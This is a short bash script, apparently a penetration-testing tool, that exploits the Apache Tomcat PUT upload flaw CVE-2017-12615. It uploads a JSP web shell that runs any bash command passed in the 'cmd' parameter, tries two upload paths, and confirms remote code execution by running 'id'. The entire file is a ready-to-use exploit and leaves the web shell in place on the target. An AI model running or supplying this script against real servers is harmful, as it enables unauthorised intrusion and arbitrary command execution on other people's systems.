#!/bin/bash
# PUT 方法上传 JSP (CVE-2017-12615)
# Usage: tomcat_put_jsp.sh <ENDPOINT>
set -euo pipefail

ENDPOINT="${1:-http://127.0.0.1:8080}"

BASE=$(echo "$ENDPOINT" | sed 's|^\(https\?://[^/]*\).*|\1|')
JSP_PAYLOAD='<%@page import="java.util.*,java.io.*"%><%String c=request.getParameter("cmd");if(c!=null){Process p=Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",c});BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));String l;while((l=br.readLine())!=null)out.println(l);}%>'

echo "=== PUT /file.jsp/ ==="
curl -s -X PUT "$BASE/pentest_cmd.jsp/" -d "$JSP_PAYLOAD" --max-time 10 2>/dev/null
sleep 1
result=$(curl -s "$BASE/pentest_cmd.jsp?cmd=id" --max-time 10 2>/dev/null)
echo "RESULT: $result"
if echo "$result" | grep -q "uid="; then echo "TOMCAT_PUT_RCE"; exit 0; fi
echo "=== PUT /file.jsp (direct) ==="
curl -s -X PUT "$BASE/pentest_cmd2.jsp" -d "$JSP_PAYLOAD" --max-time 10 2>/dev/null
sleep 1
result2=$(curl -s "$BASE/pentest_cmd2.jsp?cmd=id" --max-time 10 2>/dev/null)
echo "RESULT2: $result2"
if echo "$result2" | grep -q "uid="; then echo "TOMCAT_PUT_RCE"; fi
